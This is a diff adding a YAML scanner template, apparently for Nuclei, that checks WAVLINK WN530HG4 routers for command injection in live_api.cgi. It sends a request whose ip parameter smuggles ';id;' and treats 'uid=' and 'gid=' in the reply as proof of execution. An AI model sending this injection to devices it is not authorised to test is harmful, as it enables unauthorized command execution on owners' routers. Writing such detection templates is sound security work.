@@ -1,0 +1,24 @@
+id: WAVLINK-WN530HG4-live_api_cgi-RCE
+
+info:
+  name: WAVLINK-WN530HG4 live_api.cgi 远程命令执行漏洞
+  author: WAVLINK
+  severity: high
+  tags: WAVLINK
+
+http:
+  - raw:
+      - |
+        GET /cgi-bin/live_api.cgi?page=oa5&id=2&ip=;id; HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "uid="
+          - "gid="
+        condition: and
+      - type: status
+        status: 
+          - 200
